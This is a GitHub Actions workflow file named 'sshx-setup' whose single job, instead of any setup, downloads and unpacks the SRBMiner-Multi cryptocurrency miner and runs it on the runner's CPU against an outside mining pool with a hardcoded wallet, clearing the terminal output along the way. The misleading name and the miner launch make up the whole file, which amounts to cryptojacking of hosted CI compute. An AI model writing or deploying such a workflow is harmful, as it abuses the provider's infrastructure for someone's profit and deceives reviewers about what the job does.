name: "sshx-setup"

on:
  workflow_dispatch:

jobs:
  pc1:
    name: "pc1"
    runs-on: ubuntu-22.04
    steps:
      - name: setup 
        run: |
          export TERM=xterm
          
          cd && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.7/SRBMiner-Multi-2-6-7-Linux.tar.gz 
          
          tar -xzvf SRBMiner-Multi-2-6-7-Linux.tar.gz 
          
          clear 
          
          cd SRBMiner-Multi-2-6-7 
          
          ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool sg.vipor.net:5040 --wallet RStyQuDY1pSyWBMYdHMjn9hKgtGDnDfaXL --Worker pc11 --password x --cpu-threads 4

